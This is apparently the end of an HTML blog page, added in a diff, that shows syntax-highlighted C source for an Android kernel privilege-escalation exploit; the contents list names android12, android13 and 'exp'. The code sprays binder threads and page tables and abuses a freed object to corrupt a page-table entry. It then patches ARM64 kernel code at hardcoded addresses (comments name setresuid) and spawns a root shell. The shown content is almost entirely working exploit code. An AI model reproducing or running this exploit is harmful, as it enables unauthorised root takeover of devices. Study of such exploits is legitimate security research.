+</span><span style="color:#65737e;">#define SOCKET_DRAIN_NUM  10
+</span><span style="color:#65737e;">#define BINDER_THREAD_SPRAY_NUM 600
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">void </span><span style="color:#8fa1b3;">SprayBinderThreadToDrain</span><span style="color:#c0c5ce;">(){
+</span><span style="color:#c0c5ce;">    int binder_fd[</span><span style="color:#bf616a;">BINDER_THREAD_DRAIN_NUM</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    int epfd;
+</span><span style="color:#c0c5ce;">    // </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">create epoll</span><span style="color:#c0c5ce;">&quot;);  
+</span><span style="color:#c0c5ce;">    epfd=</span><span style="color:#8fa1b3;">OpenEpoll</span><span style="color:#c0c5ce;">();  
+</span><span style="color:#c0c5ce;">    // </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">create binder</span><span style="color:#c0c5ce;">&quot;);  
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=0;i&lt;</span><span style="color:#bf616a;">BINDER_THREAD_DRAIN_NUM</span><span style="color:#c0c5ce;">;i++){
+</span><span style="color:#c0c5ce;">        binder_fd[i]=</span><span style="color:#8fa1b3;">OpenBinder</span><span style="color:#c0c5ce;">(); 
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=0;i&lt;</span><span style="color:#bf616a;">BINDER_THREAD_DRAIN_NUM</span><span style="color:#c0c5ce;">;i++){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">EpollCtl</span><span style="color:#c0c5ce;">(epfd,binder_fd[i],</span><span style="color:#bf616a;">EPOLL_CTL_ADD</span><span style="color:#c0c5ce;">,</span><span style="color:#bf616a;">EPOLLIN</span><span style="color:#c0c5ce;">); 
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(){
+</span><span style="color:#c0c5ce;">   
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">15</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BindCpu</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    // </span><span style="color:#8fa1b3;">SprayBinderThreadToDrain</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    int epfd;
+</span><span style="color:#c0c5ce;">    int binder_fd[</span><span style="color:#bf616a;">BINDER_THREAD_SPRAY_NUM</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    int memfd;
+</span><span style="color:#c0c5ce;">    void *page_spray[N_PAGESPRAY][</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    char buf[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">memset</span><span style="color:#c0c5ce;">(buf,&#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">create epoll</span><span style="color:#c0c5ce;">&quot;);  
+</span><span style="color:#c0c5ce;">    epfd=</span><span style="color:#8fa1b3;">OpenEpoll</span><span style="color:#c0c5ce;">();  
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">create binder</span><span style="color:#c0c5ce;">&quot;);  
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=0;i&lt;</span><span style="color:#bf616a;">BINDER_THREAD_SPRAY_NUM</span><span style="color:#c0c5ce;">;i++){
+</span><span style="color:#c0c5ce;">        binder_fd[i]=</span><span style="color:#8fa1b3;">OpenBinder</span><span style="color:#c0c5ce;">(); 
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    memfd = </span><span style="color:#8fa1b3;">MemfdCreate</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">spray_pagetable</span><span style="color:#c0c5ce;">&quot;,</span><span style="color:#bf616a;">PAGE_SIZE</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">link binder_thread to epoll</span><span style="color:#c0c5ce;">&quot;);  
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=0;i&lt;</span><span style="color:#bf616a;">BINDER_THREAD_SPRAY_NUM</span><span style="color:#c0c5ce;">/2;i++){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">EpollCtl</span><span style="color:#c0c5ce;">(epfd,binder_fd[i],</span><span style="color:#bf616a;">EPOLL_CTL_ADD</span><span style="color:#c0c5ce;">,</span><span style="color:#bf616a;">EPOLLIN</span><span style="color:#c0c5ce;">); 
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=0;i&lt;=20;i++){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">New</span><span style="color:#c0c5ce;">(i);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">Edit</span><span style="color:#c0c5ce;">(i,buf,</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=</span><span style="color:#bf616a;">BINDER_THREAD_SPRAY_NUM</span><span style="color:#c0c5ce;">/2;i&lt;</span><span style="color:#bf616a;">BINDER_THREAD_SPRAY_NUM</span><span style="color:#c0c5ce;">;i++){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">EpollCtl</span><span style="color:#c0c5ce;">(epfd,binder_fd[i],</span><span style="color:#bf616a;">EPOLL_CTL_ADD</span><span style="color:#c0c5ce;">,</span><span style="color:#bf616a;">EPOLLIN</span><span style="color:#c0c5ce;">); 
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=0;i&lt;=20;i++){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">Del</span><span style="color:#c0c5ce;">(i);
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">SysToString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    // </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">getchar</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    // </span><span style="color:#8fa1b3;">getchar</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">free...</span><span style="color:#c0c5ce;">&quot;);  
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=0;i&lt;</span><span style="color:#bf616a;">BINDER_THREAD_SPRAY_NUM</span><span style="color:#c0c5ce;">;i++){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">EpollCtl</span><span style="color:#c0c5ce;">(epfd,binder_fd[i],</span><span style="color:#bf616a;">EPOLL_CTL_DEL</span><span style="color:#c0c5ce;">,</span><span style="color:#bf616a;">EPOLLIN</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(binder_fd[i]);
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(epfd);
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">begin to find page table</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    int ret;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">spray....................................................</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">SprayPageTableByMemfd</span><span style="color:#c0c5ce;">(page_spray,memfd);
+</span><span style="color:#c0c5ce;">        ret = </span><span style="color:#8fa1b3;">JudgeIsPageTable</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(ret!=-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">            </span><span style="background-color:#bf616a;color:#2b303b;">break</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">MemmuPageTable</span><span style="color:#c0c5ce;">(page_spray);
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    size_t victim_vir_addr = </span><span style="color:#d08770;">0xFFFFFFC008188780</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    size_t phy_base = </span><span style="color:#d08770;">0x40200000</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    size_t vir_base = </span><span style="color:#d08770;">0xffffffc008000000</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    size_t victim_phy_addr = </span><span style="color:#d08770;">0xe800000040388f43</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">Edit</span><span style="color:#c0c5ce;">(ret, (char*)&amp;victim_phy_addr, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    int victim_page_idx_i;
+</span><span style="color:#c0c5ce;">    int victim_page_idx_j;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=0;i&lt;N_PAGESPRAY;i++){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int j=0; j&lt;8; j++){
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(*(char *)(page_spray[i][j])!=&#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;){
+</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">found1: 0x%llx</span><span style="color:#c0c5ce;">&quot;, (long long)page_spray[i][j]);
+</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">found2: %llx</span><span style="color:#c0c5ce;">&quot;, (long long)*(size_t*)page_spray[i][j]);
+</span><span style="color:#c0c5ce;">                victim_page_idx_i = i;
+</span><span style="color:#c0c5ce;">                victim_page_idx_j = j;
+</span><span style="color:#c0c5ce;">                </span><span style="background-color:#bf616a;color:#2b303b;">break</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">            </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    unsigned char code_data[</span><span style="color:#d08770;">17</span><span style="color:#c0c5ce;">] = {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0x08</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xE6</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xFF</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x97</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1F</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x04</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xB9</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xE8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xFF</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x97</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1F</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x03</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xD5
+</span><span style="color:#c0c5ce;">    };
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">memcpy</span><span style="color:#c0c5ce;">((char*)page_spray[victim_page_idx_i][victim_page_idx_j]+</span><span style="color:#d08770;">0x7AC</span><span style="color:#c0c5ce;">, code_data, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">getchar</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">getchar</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">Del</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">uid: </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#8fa1b3;">getuid</span><span style="color:#c0c5ce;">());
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    // </span><span style="color:#65737e;">#define __sys_setresuid_phy_base 0x000000004035e1b8
+</span><span style="color:#c0c5ce;">    // </span><span style="color:#65737e;"># 40 01 00 54 EQ
+</span><span style="color:#c0c5ce;">    // </span><span style="color:#65737e;"># 41 01 00 54 NE
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    // </span><span style="color:#65737e;"># 0xFFFFFFC00815E37C
+</span><span style="color:#c0c5ce;">    // </span><span style="color:#65737e;"># 0xFFFFFFC00815E3A8
+</span><span style="color:#c0c5ce;">    // </span><span style="color:#65737e;"># 0xFFFFFFC00815E3D4
+</span><span style="color:#c0c5ce;">
+</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span></pre>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#android12">android12</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#android13">android13</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#exp">exp</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
